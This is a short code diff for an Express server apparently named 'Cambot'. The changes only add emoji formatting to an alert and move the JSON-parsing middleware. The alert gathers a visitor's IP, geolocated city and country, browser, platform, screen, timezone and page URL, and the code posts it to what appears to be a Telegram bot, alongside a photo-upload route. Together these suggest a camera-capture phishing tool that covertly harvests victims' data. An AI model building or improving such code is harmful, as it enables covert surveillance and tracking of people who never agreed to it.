@@ -40,25 +40,25 @@ app.post("/upload", upload.single("photo"), async (req, res) => {
   }
 });
 
-app.post("/user-access", async (req, res) => {
+app.post("/user-access", express.json(), async (req, res) => {
   try {
     const { userAgent, language, platform, screen, timezone, url } = req.body;
     const ip = req.clientIp;
     const geo = req.clientGeo;
     
     const message = `
-Cambot Camera Access
+🚨 Cambot Camera Access
 
-User Info:
-IP: ${ip}
-Location: ${geo ? `${geo.city}, ${geo.country}` : 'Unknown'}
-Browser: ${userAgent}
-Language: ${language}
-Platform: ${platform}
-Screen: ${screen}
-Timezone: ${timezone}
-URL: ${url}
-Accessed: ${new Date().toISOString()}
+👤 User Info:
+• IP: ${ip}
+• Location: ${geo ? `${geo.city}, ${geo.country}` : 'Unknown'}
+• Browser: ${userAgent}
+• Language: ${language}
+• Platform: ${platform}
+• Screen: ${screen}
+• Timezone: ${timezone}
+• URL: ${url}
+• Accessed: ${new Date().toISOString()}
     `;
 
     const tgRes = await fetch(
@@ -84,7 +84,6 @@ Accessed: ${new Date().toISOString()}
 });
 
 app.use(express.static("public"));
-app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on ${PORT}`));
